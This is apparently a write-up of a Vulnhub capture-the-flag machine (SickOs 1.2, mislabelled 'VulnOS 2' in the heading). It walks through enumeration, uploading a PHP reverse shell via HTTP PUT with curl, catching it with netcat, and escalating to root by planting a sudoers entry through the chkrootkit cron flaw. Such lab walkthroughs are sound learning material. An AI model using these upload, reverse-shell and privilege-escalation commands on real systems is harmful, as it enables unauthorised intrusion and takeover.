## Description
[Vulnhub - VulnOS 2.](https://www.vulnhub.com/entry/sickos-12,144/), This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.

## Enumeration
As usual, start off with an `nmap` scan.

### Nmap
```bash
Nmap scan report for sickos.com (192.168.1.4)
Host is up, received arp-response (0.00049s latency).

We are greeted with an image on opening the web application.

### Dirb
Let's see if any directories can be enumerated.
```
kali@kali:/$ dirb http://sickos.com

Opening the directory gives us nothing other than the version number of `lighttpd`

## Low shell
Turns out, we can add any document to `\test` directory using `PUT`. We can upload a reverse shell and access it to get a shell.
I used the `php-reverse-shell` available in `kali`. Change the `ip` and `port` and upload it using `curl`

```bash
kali@kali:~/Desktop/vulnhub/sickos$ curl -T php-reverse-shell.php http://sickos.com/test/revshell.php --http1.0
kali@kali:~/Desktop/vulnhub/sickos$ nc -lvp 8080

$ 
```

There was something peculiar that I noticed while trying to get a reverse shell. Due to some reason, the reverse shells were not connecting to any higher ports. I guess there is some kind of firewall that is blocking the requests. Very few ports such as `80, 22, 8080` seems to be working.

## Low Shell Enum

### Cronjob
```bash
$ ls -la /etc/cron.daily

```
We have few `cronjobs` in `cron.daily`. There is a [exploit](https://www.exploit-db.com/exploits/33899) for `chkrootkit`. The exploit is that, the cronjob will execute the contents of `/tmp/update`. The `cronjob` is run as `root` so we can execute commands as `root`. The best option we be to add `www-data` to `sudoers` list to gain `root`.

## Root Shell
1. Add command into `/tmp/update` to include `www-data` as sudoer. We can add `www-data` as a sudoers without password.
2. Wait for the cronjob to run
3. And we are root!

```bash
$ echo "echo 'www-data ALL=(ALL) NOPASSWD: ALL'>>/etc/sudoers" > /tmp/update
$ sudo su
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls

WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.

## Afterthoughts

We can check the `iptables` to see why we were having difficulty in getting a reverse shell.

```bash
iptables -L
Chain INPUT (policy DROP)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:http-alt
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:https

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy DROP)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:http
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https
```

Only ports `22, 80, 443, 8080` are allowed via firewall. This part was really unexpected and I wasted a ton of time trying to figure out what the heck was wrong with the network configuration.
